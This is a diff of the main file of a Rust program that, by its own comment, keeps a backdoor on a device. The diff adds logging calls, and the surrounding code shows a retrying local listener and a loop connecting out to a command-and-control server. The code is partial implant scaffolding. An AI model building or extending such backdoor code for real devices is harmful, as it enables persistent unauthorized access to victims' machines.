@@ -8,6 +8,7 @@ use crate::communication::server::handle_client;
 use crate::logging::core::{setup_logging, LoggingConfiguration};
 use std::net::TcpStream;
 use std::{thread, time};
+use log::{debug, info, error};
 
 pub mod actions;
 pub mod communication;
@@ -23,16 +24,18 @@ fn run_server_loop() {
     // Using loop here because in case we fail to create the server, we should try again.
     // This is because we don't want to lose access to a device we have a backdoor on.
     loop {
+        debug!("Running server loop");
         // Blocking until server will die.
         match communication::server::run_server(SERVER_LISTENING_PORT) {
             Ok(_) => (),
             Err(e) => {
-                println!(
+                error!(
                     "Error {} when running server. Trying again in {} seconds.",
                     e, RETRY_INTERVAL_SECONDS
                 );
             }
         }
+        debug!("Sleeping {} seconds until retrying to run server again", RETRY_INTERVAL_SECONDS);
         thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS));
     }
 }
@@ -42,14 +45,14 @@ fn run_cnc_connection_loop() {
         let server_address = format!("{}:{}", CNC_SERVER_IP, CNC_SERVER_PORT);
         match TcpStream::connect(server_address) {
             Ok(stream) => {
-                println!("Successfully connected to cnc server!");
+                info!("Successfully connected to cnc server {}!", stream.peer_addr().unwrap().to_string());
                 thread::spawn(move || {
                     // connection succeeded
                     handle_client(stream)
                 });
             }
             Err(e) => {
-                println!("Failed to connect to cnc server, error: {}", e);
+                error!("Failed to connect to cnc server, error: {}", e);
             }
         }
         std::thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS))
@@ -69,6 +72,7 @@ fn init_logging() {
 
 fn main() {
     init_logging();
+    log::info!("Logging successfully initialized");
 
     // Support several ways of communication - cnc remote server + local server listening on port.
     let server_handler = thread::spawn(run_server_loop);
